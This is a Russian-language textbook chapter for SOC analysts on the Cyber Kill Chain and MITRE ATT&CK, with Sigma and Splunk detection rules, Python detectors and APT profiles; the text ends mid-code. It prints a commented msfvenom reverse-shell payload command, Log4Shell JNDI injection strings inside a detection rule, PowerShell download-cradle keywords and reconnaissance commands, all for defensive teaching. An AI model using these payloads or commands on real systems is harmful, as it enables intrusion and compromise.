# Глава 5.2: Cyber Kill Chain и MITRE ATT&CK

## 🎯 Цели главы

К концу этой главы вы будете уметь:

- Объяснить все 7 этапов Cyber Kill Chain и привести примеры атак на каждом этапе
- Ориентироваться в матрице MITRE ATT&CK: тактики, техники, подтехники
- Использовать ATT&CK Navigator для визуального анализа угроз
- Сопоставлять реальные инциденты с техниками ATT&CK (mapping)
- Применять ATT&CK в ежедневной работе SOC-аналитика
- Анализировать поведение реальных APT-группировок через призму ATT&CK

---

## 5.2.1 Cyber Kill Chain: анатомия атаки

### История и концепция

В 2011 году компания Lockheed Martin опубликовала статью "Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains". Авторы адаптировали военную концепцию "kill chain" (цепочка поражения) для кибербезопасности.

Ключевая идея: **атака — это цепочка последовательных этапов**. Если защитник разрывает цепочку на любом этапе — атака проваливается.

```
ВОЕННЫЙ Kill Chain (F2T2EA):
Find → Fix → Track → Target → Engage → Assess

CYBER Kill Chain (Lockheed Martin):
Reconnaissance → Weaponization → Delivery → Exploitation
→ Installation → C2 → Actions on Objectives
```

### Почему это важно для SOC-аналитика

Большинство алертов в SIEM отражают события на этапах 4-7. Понимание Kill Chain помогает:
- Определить, на каком этапе атаки вы обнаружили угрозу
- Понять, что уже могло произойти ДО обнаружения
- Сфокусировать расследование на нужных артефактах
- Прогнозировать следующие шаги атакующего

---

## 5.2.2 Семь этапов Cyber Kill Chain

### Этап 1: Reconnaissance (Разведка)

```
+------------------+
|  RECONNAISSANCE  |
|                  |
|  Атакующий       |
|  собирает инфо   |
|  о цели          |
+------------------+
         |
         v
   [Пассивная]    [Активная]
   OSINT           Сканирование
   Shodan          nmap
   LinkedIn        Nikto
   Wayback         DNS enum
```

**Что делает атакующий:**
- Изучает публичные источники (OSINT): LinkedIn, GitHub, Glassdoor
- Собирает технические данные: IP-диапазоны, DNS-записи, поддомены
- Исследует веб-приложения: технологический стек, версии ПО
- Пассивный сбор через Shodan, Censys, Google dorks

**Примеры техник:**

```bash
# Google Dorks для разведки
site:example.com filetype:pdf
site:example.com inurl:admin
"example.com" ext:sql OR ext:bak OR ext:conf

# Сбор поддоменов
subfinder -d example.com
amass enum -d example.com

# Поиск email-адресов
theHarvester -d example.com -b google,linkedin,shodan
```

**Что ищет SOC-аналитик:**
- Сканирование портов из внешних источников в IDS/IPS логах
- Аномальные DNS-запросы (zone transfer, перебор поддоменов)
- Доступ к robots.txt, sitemap.xml с нетипичных IP
- Запросы в Web Application Firewall с подозрительными паттернами

---

### Этап 2: Weaponization (Вооружение)

```
+------------------+
|  WEAPONIZATION   |
|                  |
|  Создание        |
|  вредоносного    |
|  инструмента     |
+------------------+

Эксплойт + Payload = Оружие
    |            |
    v            v
CVE-XXXX     Meterpreter
PDF exploit  Cobalt Strike
Word macro   Custom RAT
```

**Что делает атакующий:**
- Создаёт вредоносный документ (Word/Excel с макросом)
- Компилирует кастомный вредоносный код (RAT, backdoor)
- Упаковывает эксплойт с payload (например, Metasploit)
- Настраивает инфраструктуру C2 (Command & Control)

**Примеры:**

```python
# Пример вредоносного макроса (концептуально, для обучения)
# Атакующий создаёт документ с автозапуском при открытии

# Инструменты вооружения:
# - msfvenom: генерация payload
# - Empire: PowerShell post-exploitation
# - Cobalt Strike: коммерческий C2
# - Covenant: .NET C2 фреймворк

# msfvenom пример команды (для понимания принципа):
# msfvenom -p windows/x64/meterpreter/reverse_tcp \
#   LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
```

**Что ищет SOC-аналитик:**
- На этом этапе SOC практически слеп (атака происходит на стороне атакующего)
- Однако: TI-фиды могут содержать хэши известных вредоносных файлов
- Мониторинг Dark Web и хакерских форумов (Threat Intelligence)

---

### Этап 3: Delivery (Доставка)

```
+------------------+
|    DELIVERY      |
|                  |
|  Доставка        |
|  оружия          |
|  к цели          |
+------------------+

Методы доставки:
+----------+  +-----------+  +----------+
|  Email   |  |  Web      |  |  USB     |
|  Phishing|  |  Drive-by |  |  Drop    |
|  (91%)   |  |  Download |  |  (редко) |
+----------+  +-----------+  +----------+
     |              |
     v              v
 Attachment      Exploit kit
 Malicious URL   Watering hole
 Spear-phishing  Browser exploit
```

**Что делает атакующий:**
- Отправляет фишинговое письмо с вложением или ссылкой
- Компрометирует легитимный сайт (watering hole)
- Использует USB-накопители (для изолированных сетей)
- Атака через supply chain (компрометация поставщика ПО)

**Реальный пример: SolarWinds (2020)**

```
Supply Chain Attack:
1. Атакующие (APT29/Cozy Bear) компрометируют
   систему сборки SolarWinds Orion
2. Вредоносный код (SUNBURST backdoor) встраивается
   в легитимные обновления
3. 18 000 организаций устанавливают "обновление"
4. Payload активируется через 14 дней после установки

Этап Delivery: легитимный update server SolarWinds
```

**Что ищет SOC-аналитик:**
- Email Gateway логи: подозрительные вложения (maldoc), внешние ссылки
- Proxy/Web Gateway: загрузки исполняемых файлов, обращения к C2
- EDR: создание файлов из email-клиентов (Outlook → Word → cmd.exe)
- DNS: обращения к новым/молодым доменам

```python
# Пример Python-скрипта для анализа подозрительных писем
import re
import hashlib
from pathlib import Path

def analyze_email_headers(raw_email: str) -> dict:
    """Извлечение подозрительных признаков из email-заголовков"""
    findings = {
        "spf_fail": False,
        "dkim_fail": False,
        "reply_to_mismatch": False,
        "suspicious_links": [],
    }
    
    # Проверка SPF
    if "spf=fail" in raw_email.lower():
        findings["spf_fail"] = True
    
    # Поиск URL в теле письма
    urls = re.findall(r'https?://[^\s<>"]+', raw_email)
    for url in urls:
        # Проверка на подозрительные TLD или паттерны
        if any(suspicious in url for suspicious in ['.ru/', '.tk/', '.xyz/', 'bit.ly']):
            findings["suspicious_links"].append(url)
    
    return findings

# Использование
# findings = analyze_email_headers(open("suspicious.eml").read())
```

---

### Этап 4: Exploitation (Эксплуатация)

```
+------------------+
|  EXPLOITATION    |
|                  |
|  Использование   |
|  уязвимости      |
|  для выполнения  |
|  кода            |
+------------------+

Типы эксплуатации:
Software  | User      | Zero-day
Vuln      | Execution | Exploit
----------|-----------|--------
CVE-based | Macro     | Unknown
Buffer    | Script    | 0day
overflow  | Click     |
```

**Что делает атакующий:**
- Эксплуатирует уязвимость в ПО (CVE)
- Выполняет код через действие пользователя (кликнул → макрос запустился)
- Использует логическую уязвимость в бизнес-процессе

**Реальные примеры уязвимостей:**

| CVE | Описание | Exploitation |
|-----|----------|-------------|
| CVE-2021-44228 | Log4Shell (Log4j) | Remote Code Execution |
| CVE-2021-34527 | PrintNightmare | Privilege Escalation |
| CVE-2017-0144 | EternalBlue (WannaCry) | RCE через SMB |
| CVE-2020-1472 | Zerologon | AD takeover |

**Что ищет SOC-аналитик:**
- EDR: нетипичные дочерние процессы (winword.exe → powershell.exe)
- SIEM: ошибки приложений с переполнением буфера
- IDS: сигнатуры известных эксплойтов (Snort/Suricata правила)
- AV/EDR: детект shellcode в памяти

```bash
# Пример правила Sigma для детекции Log4Shell
title: Log4Shell Exploitation Attempt
status: experimental
description: Detects Log4Shell JNDI injection attempts in web logs
logsource:
    category: webserver
detection:
    keywords:
        - '${jndi:ldap://'
        - '${jndi:rmi://'
        - '${${::-j}${::-n}${::-d}${::-i}:'
    condition: keywords
falsepositives:
    - Security scanning tools
level: critical
tags:
    - attack.initial_access
    - attack.t1190
```

---

### Этап 5: Installation (Закрепление)

```
+------------------+
|  INSTALLATION    |
|                  |
|  Установка       |
|  постоянного     |
|  присутствия     |
+------------------+

Persistence механизмы:
+-------------+  +-------------+  +-------------+
| Registry    |  | Scheduled   |  | Service     |
| Run Keys    |  | Tasks       |  | Creation    |
+-------------+  +-------------+  +-------------+
+-------------+  +-------------+  +-------------+
| Startup     |  | DLL         |  | Boot/Logon  |
| Folder      |  | Hijacking   |  | Script      |
+-------------+  +-------------+  +-------------+
```

**Что делает атакующий:**
- Создаёт записи автозапуска в реестре Windows
- Устанавливает вредоносный сервис
- Создаёт scheduled task
- Модифицирует загрузчик (bootkit)
- Устанавливает веб-шелл на скомпрометированный сервер

**Примеры persistence в реестре:**

```
Ключевые ветки реестра для persistence:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
HKLM\SYSTEM\CurrentControlSet\Services
```

**Что ищет SOC-аналитик:**

```python
# Python-скрипт для мониторинга изменений реестра
import winreg
import time
import hashlib
import json

MONITORED_KEYS = [
    (winreg.HKEY_LOCAL_MACHINE, 
     r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
    (winreg.HKEY_CURRENT_USER, 
     r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
    (winreg.HKEY_LOCAL_MACHINE, 
     r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"),
]

def snapshot_registry_key(hive, path: str) -> dict:
    """Создание снимка значений ключа реестра"""
    snapshot = {}
    try:
        key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
        i = 0
        while True:
            try:
                name, value, _ = winreg.EnumValue(key, i)
                snapshot[name] = str(value)
                i += 1
            except WindowsError:
                break
        winreg.CloseKey(key)
    except Exception as e:
        snapshot["_error"] = str(e)
    return snapshot

def detect_registry_changes(baseline: dict, current: dict) -> list:
    """Обнаружение изменений между снимками"""
    changes = []
    
    # Новые записи
    for key in set(current) - set(baseline):
        changes.append({
            "type": "ADDED",
            "name": key,
            "value": current[key]
        })
    
    # Удалённые записи
    for key in set(baseline) - set(current):
        changes.append({
            "type": "DELETED",
            "name": key,
            "old_value": baseline[key]
        })
    
    # Изменённые записи
    for key in set(baseline) & set(current):
        if baseline[key] != current[key]:
            changes.append({
                "type": "MODIFIED",
                "name": key,
                "old_value": baseline[key],
                "new_value": current[key]
            })
    
    return changes
```

---

### Этап 6: Command & Control (C2)

```
+------------------+
|  COMMAND &       |
|  CONTROL (C2)    |
|                  |
|  Управление      |
|  заражённой      |
|  машиной         |
+------------------+

C2 Communication:
[Скомпрометированный хост]
         |
         | Зашифрованный канал
         | (HTTPS/DNS/ICMP)
         v
   [C2 Server]
         |
    [Атакующий]

Методы C2:
HTTP/S   → Похож на легитимный трафик
DNS      → Туннелирование через DNS запросы
ICMP     → Туннелирование через ping
Social   → Управление через Twitter/Pastebin
Media
```

**Что делает атакующий:**
- Устанавливает зашифрованный канал связи с C2-сервером
- Использует легитимные сервисы как C2 (GitHub, Dropbox, Twitter)
- Применяет Domain Generation Algorithm (DGA) для обхода блокировок
- Использует fast-flux DNS для смены IP-адресов C2

**Примеры C2 коммуникации:**

```python
# Пример обнаружения DNS-туннелирования (для понимания принципа)
import collections
from typing import List

def detect_dns_tunneling(dns_queries: List[dict]) -> List[dict]:
    """
    Обнаружение DNS-туннелирования по аномалиям:
    - Длинные доменные имена
    - Высокая энтропия субдоменов
    - Высокая частота запросов к одному домену
    """
    import math
    import string
    
    suspicious = []
    domain_frequency = collections.Counter()
    
    for query in dns_queries:
        domain = query.get("domain", "")
        subdomain = domain.split(".")[0] if "." in domain else domain
        
        # Признак 1: Длинный субдомен (>50 символов)
        if len(subdomain) > 50:
            suspicious.append({
                "domain": domain,
                "reason": f"Long subdomain: {len(subdomain)} chars",
                "severity": "HIGH"
            })
            continue
        
        # Признак 2: Высокая энтропия субдомена
        entropy = calculate_entropy(subdomain)
        if entropy > 3.5:
            suspicious.append({
                "domain": domain,
                "reason": f"High entropy subdomain: {entropy:.2f}",
                "severity": "MEDIUM"
            })
        
        domain_frequency[".".join(domain.split(".")[-2:])] += 1
    
    # Признак 3: Аномально высокая частота запросов к домену
    for domain, count in domain_frequency.items():
        if count > 100:  # порог
            suspicious.append({
                "domain": domain,
                "reason": f"High query frequency: {count}",
                "severity": "MEDIUM"
            })
    
    return suspicious

def calculate_entropy(text: str) -> float:
    """Вычисление энтропии Шеннона"""
    if not text:
        return 0
    freq = collections.Counter(text)
    length = len(text)
    return -sum((count/length) * math.log2(count/length) 
                for count in freq.values())
```

**Что ищет SOC-аналитик:**
- Прокси/DNS логи: обращения к молодым доменам, DGA-паттерны
- NetFlow: необычные объёмы трафика, beaconing (регулярные соединения)
- Firewall: исходящие соединения на нестандартные порты
- EDR: процессы, устанавливающие сетевые соединения

---

### Этап 7: Actions on Objectives (Достижение целей)

```
+------------------+
|  ACTIONS ON      |
|  OBJECTIVES      |
|                  |
|  Атакующий       |
|  достигает       |
|  своей цели      |
+------------------+

Типичные цели:
+----------+  +----------+  +----------+
| Data     |  | Crypto-  |  | Sabotage |
| Theft    |  | mining   |  | / Wiper  |
+----------+  +----------+  +----------+
+----------+  +----------+  +----------+
| Ransom-  |  | Lateral  |  | Espionage|
| ware     |  | Movement |  |          |
+----------+  +----------+  +----------+
```

**Что делает атакующий:**
- Эксфильтрация данных (кража конфиденциальной информации)
- Шифрование файлов (Ransomware)
- Lateral movement (продвижение по сети)
- Уничтожение данных/систем
- Майнинг криптовалюты

**Реальный пример: Colonial Pipeline (2021)**

```
Этап 7 - Ransomware:
1. DarkSide получили доступ через VPN (скомпрометированный пароль)
2. Lateral movement по корпоративной сети
3. Развёртывание ransomware
4. Шифрование 100GB данных
5. Требование выкупа 75 биткоинов (~4.4 млн USD)
6. Colonial Pipeline остановил трубопровод
   (из соображений безопасности, не из-за атаки на ОТ)
```

---

## 5.2.3 Ограничения Cyber Kill Chain

Несмотря на популярность, Kill Chain имеет критиков:

| Ограничение | Проблема |
|-------------|----------|
| Линейность | Реальные атаки не всегда линейны |
| Ориентация на вторжение | Плохо описывает insider threats |
| Нет учёта облаков | Разработан до эпохи SaaS/IaaS |
| Устарел для мобильных | Не покрывает мобильные платформы |
| Нет lateral movement | Пропускает движение внутри сети |

**Альтернативы и дополнения:**
- MITRE ATT&CK (более детальная и актуальная модель)
- Diamond Model (акцент на атрибуции)
- Unified Kill Chain (расширенная версия для современных атак)

---

## 5.2.4 MITRE ATT&CK: введение

### Что такое MITRE ATT&CK

**MITRE ATT&CK** (Adversarial Tactics, Techniques & Common Knowledge) — это общедоступная база знаний о методах, которые реальные атакующие используют против реальных систем. В отличие от Kill Chain, ATT&CK основан на наблюдениях за реальными атаками.

```
KILL CHAIN vs ATT&CK:

Kill Chain:       7 этапов (высокий уровень)
ATT&CK:           14 тактик, 200+ техник, 400+ подтехник

Kill Chain:       "Атакующий получил persistence"
ATT&CK:           T1547.001 Registry Run Keys / Startup Folder
                  T1053.005 Scheduled Task
                  T1543.003 Windows Service
```

### Компоненты ATT&CK

```
ATT&CK Framework
├── Tactics (ЗАЧЕМ?) - цели атакующего
│   ├── Initial Access
│   ├── Execution
│   ├── Persistence
│   └── ... (14 всего в Enterprise)
│
├── Techniques (КАК?) - метод достижения цели
│   ├── T1566 Phishing
│   ├── T1078 Valid Accounts
│   └── ... (200+ техник)
│
└── Sub-techniques (КАК ИМЕННО?)
    ├── T1566.001 Spearphishing Attachment
    ├── T1566.002 Spearphishing Link
    └── T1566.003 Spearphishing via Service
```

---

## 5.2.5 ATT&CK Tactics: 14 тактик Enterprise

```
+----+------------------------+----------------------------------+
| #  | Тактика                | Вопрос                           |
+----+------------------------+----------------------------------+
| 1  | Reconnaissance         | Как атакующий собирает инфо?     |
| 2  | Resource Development   | Как готовит инфраструктуру?      |
| 3  | Initial Access         | Как проникает в сеть?            |
| 4  | Execution              | Как запускает код?               |
| 5  | Persistence            | Как остаётся в системе?          |
| 6  | Privilege Escalation   | Как повышает привилегии?         |
| 7  | Defense Evasion        | Как избегает обнаружения?        |
| 8  | Credential Access      | Как получает учётные данные?     |
| 9  | Discovery              | Как изучает окружение?           |
| 10 | Lateral Movement       | Как перемещается по сети?        |
| 11 | Collection             | Как собирает данные?             |
| 12 | Command and Control    | Как управляет системой?          |
| 13 | Exfiltration           | Как выводит данные?              |
| 14 | Impact                 | Как воздействует на цель?        |
+----+------------------------+----------------------------------+
```

### Тактика 3: Initial Access (Начальный доступ)

Самые популярные техники Initial Access:

| Техника | ID | Описание |
|---------|-----|---------|
| Phishing | T1566 | Фишинг через email |
| Valid Accounts | T1078 | Использование легитимных аккаунтов |
| Exploit Public App | T1190 | Эксплуатация публичных приложений |
| Supply Chain Compromise | T1195 | Компрометация цепочки поставок |
| Drive-by Compromise | T1189 | Атака через посещение сайта |
| External Remote Services | T1133 | RDP, VPN, Citrix |

### Тактика 7: Defense Evasion (самая большая)

Defense Evasion содержит более 40 техник — это самая большая тактика:

```
Популярные техники Defense Evasion:
T1055  - Process Injection
T1036  - Masquerading (переименование вредоноса под svchost.exe)
T1027  - Obfuscated Files or Information
T1070  - Indicator Removal on Host
T1112  - Modify Registry
T1562  - Impair Defenses (отключение AV/EDR)
T1140  - Deobfuscate/Decode Files or Information
T1218  - System Binary Proxy Execution (LOLBAS)
```

---

## 5.2.6 Глубокий разбор ключевых техник

### T1059: Command and Scripting Interpreter

```
T1059 - Command and Scripting Interpreter
├── T1059.001 - PowerShell
├── T1059.002 - AppleScript
├── T1059.003 - Windows Command Shell (cmd.exe)
├── T1059.004 - Unix Shell
├── T1059.005 - Visual Basic (VBS)
├── T1059.006 - Python
├── T1059.007 - JavaScript
└── T1059.008 - Network Device CLI
```

**Пример детекции PowerShell (T1059.001):**

```python
# Sigma-правило для обнаружения PowerShell с подозрительными параметрами
# Конвертируется в запросы для Splunk/Elastic/Sentinel

sigma_rule = """
title: Suspicious PowerShell Parameter Combinations
id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
status: stable
description: |
    Detects PowerShell execution with suspicious parameter combinations
    commonly used by malware and offensive tools.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - '-enc '
            - '-EncodedCommand'
            - '-nop '
            - '-NonInteractive'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - 'IEX'
            - 'Invoke-Expression'
            - 'downloadstring'
            - 'DownloadFile'
    condition: selection
falsepositives:
    - Legitimate admin scripts
    - Software deployment tools
level: medium
tags:
    - attack.execution
    - attack.t1059.001
"""

# Конвертация в Splunk SPL запрос:
splunk_query = """
index=windows EventCode=4688
Image="*\\powershell.exe"
(CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" 
 OR CommandLine="*IEX*" OR CommandLine="*DownloadString*")
| stats count by ComputerName, User, CommandLine
| sort -count
"""
```

### T1003: OS Credential Dumping

Дамп учётных данных — критически важная техника:

```
T1003 - OS Credential Dumping
├── T1003.001 - LSASS Memory (Mimikatz)
├── T1003.002 - Security Account Manager (SAM)
├── T1003.003 - NTDS (Active Directory)
├── T1003.004 - LSA Secrets
├── T1003.005 - Cached Domain Credentials
├── T1003.006 - DCSync
└── T1003.008 - /etc/passwd and /etc/shadow
```

**Детекция Mimikatz (T1003.001):**

```python
# Правило для обнаружения попыток доступа к LSASS
lsass_detection_splunk = """
index=windows EventCode=10  
TargetImage="*lsass.exe"
(GrantedAccess="0x1010" OR GrantedAccess="0x1410" 
 OR GrantedAccess="0x147a" OR GrantedAccess="0x143a")
NOT (SourceImage="*\\MsMpEng.exe" OR SourceImage="*\\svchost.exe")
| table _time, SourceImage, TargetImage, GrantedAccess, Computer
| sort -_time
"""

# EventCode=10 - Process Access event (Sysmon)
# GrantedAccess коды соответствуют правам на чтение памяти LSASS
```

### T1021: Remote Services (Lateral Movement)

```
T1021 - Remote Services
├── T1021.001 - Remote Desktop Protocol (RDP)
├── T1021.002 - SMB/Windows Admin Shares
├── T1021.003 - Distributed Component Object Model (DCOM)
├── T1021.004 - SSH
├── T1021.005 - VNC
└── T1021.006 - Windows Remote Management (WinRM)
```

---

## 5.2.7 ATT&CK Matrices: Enterprise, Mobile, ICS

### Enterprise Matrix

Основная матрица, покрывает Windows, macOS, Linux, облачные платформы:

```
Enterprise ATT&CK охватывает платформы:
┌─────────────┬─────────────┬─────────────┬─────────────┐
│   Windows   │    macOS    │    Linux    │    Cloud    │
│             │             │             │  AWS/Azure  │
│  14 тактик  │  14 тактик  │  14 тактик  │  Google     │
│  200+ техн. │             │             │   Cloud     │
└─────────────┴─────────────┴─────────────┴─────────────┘
```

### Mobile Matrix

Специализированная матрица для iOS и Android:

```
Mobile ATT&CK:
├── 14 тактик (адаптированные)
├── Специфичные техники:
│   ├── T1444 Masquerade as Legitimate Application
│   ├── T1430 Location Tracking
│   ├── T1429 Capture Audio
│   └── T1513 Screen Capture
└── Покрывает атаки на мобильные устройства
    (spyware, stalkerware, MDM bypass)
```

### ICS Matrix (Industrial Control Systems)

```
ICS ATT&CK:
├── 12 тактик (уникальные для ОТ/ICS)
│   ├── Impair Process Control
│   ├── Inhibit Response Function
│   └── Impact (уничтожение оборудования)
├── Примеры атак:
│   ├── Stuxnet (атака на центрифуги Иран)
│   ├── Industroyer (атака на энергосеть Украина)
│   └── TRITON/TRISIS (атака на safety systems)
└── Особенность: ущерб в физическом мире
```

---

## 5.2.8 ATT&CK Navigator: практическое использование

ATT&CK Navigator — веб-приложение для визуализации и анализа матрицы.

### Доступ и запуск

```bash
# Онлайн версия (не требует установки):
# https://mitre-attack.github.io/attack-navigator/

# Локальная установка:
git clone https://github.com/mitre-attack/attack-navigator.git
cd attack-navigator/nav-app
npm install
npm start
# Открыть: http://localhost:4200
```

### Основные операции в Navigator

```
Операции с Navigator:
1. Создание нового слоя (New Layer → Enterprise ATT&CK)
2. Выделение техник:
   - Клик на технику → выделить
   - Shift+клик → выбор нескольких
   - Поиск по ID или названию
3. Цветовая кодировка:
   - Красный = техники атакующего
   - Синий = наши детекции
   - Зелёный = покрытые контролями
4. Экспорт:
   - PNG/SVG для презентаций
   - JSON для программной обработки
```

### Практический сценарий: анализ возможностей SOC

```python
# Python API для работы с ATT&CK через TAXII
from attackcti import attack_client

def get_techniques_by_tactic(tactic_name: str) -> list:
    """Получение всех техник для заданной тактики"""
    lift = attack_client()
    
    techniques = lift.get_techniques_by_tactic(
        tactic_name,
        "enterprise-attack"
    )
    
    result = []
    for technique in techniques:
        result.append({
            "id": technique.get("external_references", [{}])[0].get("external_id"),
            "name": technique.get("name"),
            "description": technique.get("description", "")[:200],
        })
    
    return result

def create_detection_layer(detected_techniques: list) -> dict:
    """
    Создание JSON-слоя для ATT&CK Navigator
    с отметкой задетектированных техник
    """
    layer = {
        "name": "SOC Detection Coverage",
        "versions": {
            "attack": "14",
            "navigator": "4.9",
            "layer": "4.5"
        },
        "domain": "enterprise-attack",
        "description": "Current SOC detection capabilities",
        "techniques": []
    }
    
    for tech_id in detected_techniques:
        layer["techniques"].append({
            "techniqueID": tech_id,
            "color": "#4CAF50",  # Зелёный - покрыто детекцией
            "comment": "Covered by SIEM rules",
            "enabled": True,
        })
    
    return layer

# Пример использования:
# detected = ["T1059.001", "T1003.001", "T1566.001", "T1078"]
# layer = create_detection_layer(detected)
# import json
# with open("soc_coverage.json", "w") as f:
#     json.dump(layer, f, indent=2)
```

### Практический сценарий: сравнение APT-групп

```
Navigator позволяет:
1. Загрузить слои для двух APT-групп
2. Применить операцию "Score Comparison"
3. Увидеть пересекающиеся техники → общие IOC
4. Определить уникальные техники каждой группы

Пример:
APT29 (Cozy Bear) vs APT28 (Fancy Bear)
→ Обе группы используют T1059.001 (PowerShell)
→ APT29 уникально использует T1548 (Abuse Elevation Control Mechanism)
→ Обе → готовить детекции для пересечения
```

---

## 5.2.9 Сопоставление инцидентов с ATT&CK (Mapping)

### Методология mapping

```
Процесс mapping инцидента на ATT&CK:

1. СБОР ДАННЫХ
   ┌──────────────────────────────────────┐
   │ Логи, IOC, артефакты, timeline       │
   └──────────────────────────────────────┘
            │
            v
2. ИДЕНТИФИКАЦИЯ ПОВЕДЕНИЯ
   ┌──────────────────────────────────────┐
   │ "cmd.exe запустился из winword.exe"  │
   │ "Создана новая служба"               │
   │ "Доступ к LSASS"                     │
   └──────────────────────────────────────┘
            │
            v
3. ПОИСК В ATT&CK
   ┌──────────────────────────────────────┐
   │ T1059.003 - Windows Command Shell    │
   │ T1543.003 - Windows Service          │
   │ T1003.001 - LSASS Memory             │
   └──────────────────────────────────────┘
            │
            v
4. ДОКУМЕНТИРОВАНИЕ
   ┌──────────────────────────────────────┐
   │ Инцидент-отчёт с ATT&CK тегами      │
   │ Navigator слой для визуализации      │
   └──────────────────────────────────────┘
```

### Практический пример mapping: фишинговый инцидент

**Сценарий:** Пользователь открыл вложение в письме, система заражена.

```
НАБЛЮДЕНИЕ                          ATT&CK ТЕХНИКА
─────────────────────────────────────────────────────
Получено письмо с .docx вложением → T1566.001
(Spearphishing Attachment)

Документ содержал макрос             → T1204.002
пользователь кликнул Enable          (Malicious File)

Макрос запустил PowerShell           → T1059.001
(PowerShell)

PowerShell загрузил payload          → T1105
из интернета                         (Ingress Tool Transfer)

Создан ключ реестра Run              → T1547.001
для persistence                      (Registry Run Keys)

Зашифрованный трафик к              → T1071.001
внешнему IP каждые 5 мин            (Web Protocols - C2)

Обращение к \\FILESERVER\shares     → T1039
(Data from Network Shared Drive)

Архив данных создан в %TEMP%        → T1560.001
(Archive via Utility)

Данные отправлены через HTTPS       → T1048.002
(Exfiltration Over Asymmetric        
Encrypted Non-C2 Protocol)
```

### Инструменты для mapping

```bash
# 1. Использование SIGMA правил с ATT&CK тегами
# Каждое Sigma правило содержит теги вида:
# tags:
#   - attack.initial_access
#   - attack.t1566.001

# 2. Atomic Red Team - тестовые атаки для проверки детекций
# https://github.com/redcanaryco/atomic-red-team

# Запуск атомарного теста:
Invoke-AtomicTest T1059.001 -TestNumbers 1
# Это симулирует PowerShell обфускацию
# и проверяет, сработает ли ваша детекция

# 3. Vectr - платформа для отслеживания red team операций
# с mapping на ATT&CK
```

---

## 5.2.10 Реальные APT через призму ATT&CK

### APT29 (Cozy Bear / Nobelium) — Россия

Группа, ответственная за SolarWinds, атаки на США и Европу.

```
APT29 ATT&CK Profile:
┌─────────────────────────────────────────────────┐
│ Initial Access                                   │
│  T1195.002 - Compromise Software Supply Chain   │
│  T1566.002 - Spearphishing Link                 │
├─────────────────────────────────────────────────┤
│ Execution                                        │
│  T1059.001 - PowerShell                         │
│  T1059.003 - Windows Command Shell              │
├─────────────────────────────────────────────────┤
│ Persistence                                      │
│  T1547.001 - Registry Run Keys                  │
│  T1053.005 - Scheduled Task                     │
├─────────────────────────────────────────────────┤
│ Defense Evasion                                  │
│  T1070.004 - File Deletion                      │
│  T1027   - Obfuscated Files                     │
│  T1036   - Masquerading                         │
├─────────────────────────────────────────────────┤
│ Credential Access                                │
│  T1003.001 - LSASS Memory                       │
│  T1558.003 - Kerberoasting                      │
├─────────────────────────────────────────────────┤
│ C2                                               │
│  T1071.001 - Web Protocols (HTTPS)              │
│  T1132.001 - Standard Encoding                  │
└─────────────────────────────────────────────────┘
```

### APT41 (Double Dragon) — Китай

Уникальная группа: сочетает шпионаж и киберкриминал.

```
APT41 ATT&CK Profile (избранные техники):
┌─────────────────────────────────────────────────┐
│ Initial Access                                   │
│  T1190 - Exploit Public-Facing Application      │
│  T1078 - Valid Accounts                         │
├─────────────────────────────────────────────────┤
│ Execution                                        │
│  T1059.001 - PowerShell                         │
│  T1059.006 - Python                             │
├─────────────────────────────────────────────────┤
│ Persistence                                      │
│  T1543.003 - Windows Service                    │
│  T1505.003 - Web Shell                          │
├─────────────────────────────────────────────────┤
│ Privilege Escalation                             │
│  T1068 - Exploitation for Privilege Escalation  │
│  (кастомные 0-day эксплойты)                    │
├─────────────────────────────────────────────────┤
│ Impact (финансовая мотивация)                    │
│  T1486 - Data Encrypted for Impact (Ransomware) │
└─────────────────────────────────────────────────┘
```

### Lazarus Group (APT38) — Северная Корея

Атаки на банки, криптобиржи, финансовые мотивы.

```
Lazarus ATT&CK Profile:
┌─────────────────────────────────────────────────┐
│ Initial Access                                   │
│  T1566.001 - Spearphishing Attachment           │
│  T1189 - Drive-by Compromise                    │
├─────────────────────────────────────────────────┤
│ Execution                                        │
│  T1204.002 - Malicious File                     │
├─────────────────────────────────────────────────┤
│ Persistence                                      │
│  T1543.003 - Windows Service                    │
├─────────────────────────────────────────────────┤
│ Impact                                           │
│  T1486 - Data Encrypted for Impact              │
│  T1485 - Data Destruction                       │
│  T1657 - Financial Theft (SWIFT attacks)        │
└─────────────────────────────────────────────────┘

Известные кампании:
- WannaCry (2017) - глобальный ransomware
- Bangladesh Bank Heist (2016) - $81 млн SWIFT
- Sony Pictures Hack (2014)
```

---

## 5.2.11 ATT&CK в ежедневной работе SOC-аналитика

### Утренний брифинг: TI через ATT&CK

```
SOC Morning Routine:
08:00 - Просмотр алертов за ночь
08:30 - Анализ TI-отчётов новых угроз:
        "Новый TTPs APT28: T1566.002, T1059.001"
        → Проверить наши детекции для этих техник
        → Обновить правила если не покрыто
09:00 - Triage алертов с ATT&CK тегами
        Алерт: "Suspicious PowerShell" → T1059.001
        → Смотреть контекст: есть ли T1566 перед этим?
        → Есть ли T1003 или T1021 после?
```

### Процесс расследования алерта

```python
# Псевдокод процесса расследования с ATT&CK
class AlertInvestigation:
    def __init__(self, alert: dict):
        self.alert = alert
        self.timeline = []
        self.attack_techniques = []
    
    def map_to_attack(self, observation: str) -> str:
        """Сопоставление наблюдения с ATT&CK техникой"""
        mapping = {
            "powershell -enc": "T1059.001",
            "lsass access": "T1003.001",
            "new service created": "T1543.003",
            "scheduled task created": "T1053.005",
            "registry run key modified": "T1547.001",
            "rdp connection": "T1021.001",
            "pass the hash": "T1550.002",
            "mimikatz": "T1003.001",
            "cobalt strike": "T1071.001",
        }
        
        for pattern, technique in mapping.items():
            if pattern in observation.lower():
                return technique
        return "UNKNOWN"
    
    def build_attack_chain(self, observations: list) -> dict:
        """Построение цепочки атаки"""
        chain = {
            "initial_access": [],
            "execution": [],
            "persistence": [],
            "privilege_escalation": [],
            "defense_evasion": [],
            "credential_access": [],
